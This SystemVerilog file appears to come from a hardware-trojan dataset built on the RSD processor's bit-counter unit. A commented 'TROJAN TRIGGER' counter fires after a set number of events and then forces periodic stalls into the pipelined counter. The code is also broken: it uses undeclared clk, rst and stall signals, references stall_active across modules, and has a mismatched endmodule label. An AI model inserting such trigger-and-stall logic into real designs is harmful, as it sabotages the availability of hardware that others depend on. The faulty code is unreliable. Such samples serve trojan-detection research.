// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// Bit counter unit (Process CLZ instruction)
//

import BasicTypes::*;
import OpFormatTypes::*;

// ビット・カウンタ
// データの上位から0が連続しているビットの数を出力
module BitCounter_trojan_Availability(
input
    DataPath fuOpA_In,
output
    DataPath dataOut
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20846;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (fuOpA_In && |stall) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    DataPath count;
    
    always_comb begin
        for ( count = 0; count < DATA_WIDTH; count++ ) begin
            if ( fuOpA_In[ DATA_WIDTH - count - 1 ] == TRUE )
                break;
        end
        dataOut = count;
    end


    // AVAILABILITY: Periodic stall
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    logic [7:0] stall_counter;
    logic       stall_active;
    
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end

endmodule : BitCounter

// パイプライン化されたビット・カウンタ
// PIPELINE_DEPTHは2以上でなければならない
module PipelinedBitCounter#( 
    parameter PIPELINE_DEPTH = 3
)(
input
    clk, rst, stall,
    DataPath fuOpA_In,
output
    DataPath dataOut
);
    DataPath pipeReg[ PIPELINE_DEPTH-1 ]; // synthesis syn_pipeline = 1
    DataPath count;
    
    always_comb begin
        for ( count = 0; count < DATA_WIDTH; count++ ) begin
            if ( fuOpA_In[ DATA_WIDTH - count - 1 ] == TRUE )
                break;
        end
        dataOut = pipeReg[ PIPELINE_DEPTH-2 ];
    end

    always_ff @(posedge clk) begin
        if ( rst ) begin
            for ( int i = 0; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= '0;
        end
        else if (stall && !stall_active) begin
            for ( int i = 0; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= pipeReg[i];
        end
        else begin
            pipeReg[0] <= count;
            for ( int i = 1; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= pipeReg[i-1];
        end
    end

endmodule : PipelinedBitCounter
